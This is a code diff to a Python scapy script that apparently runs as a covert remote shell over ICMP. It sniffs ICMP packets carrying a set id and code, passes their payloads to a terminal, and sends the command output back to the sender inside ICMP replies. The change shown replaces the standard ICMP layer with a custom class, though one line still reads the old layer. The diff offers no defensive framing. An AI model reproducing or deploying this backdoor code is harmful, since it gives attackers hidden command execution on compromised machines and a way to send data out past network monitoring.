@@ -10,6 +10,7 @@ from scapy.sendrecv import sniff, sendp
 
 import config
 import opening_terminal
+from CustomICMP import CustomICMP
 from opening_terminal import p
 
 destination_mac = "ff:ff:ff:ff:ff:ff"
@@ -23,7 +24,7 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=config.TYPE, id=config.ID,
+        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / CustomICMP(type=config.TYPE, id=config.ID,
                                                                                   code=config.RESPONSE_CODE) / string
         sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
@@ -47,7 +48,7 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if packet[ICMP].code == config.REQUEST_CODE and packet[ICMP].id == config.ID:
+    if packet[CustomICMP].code == config.REQUEST_CODE and packet[CustomICMP].id == config.ID:
         destination_ip = packet[IP].src
         destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
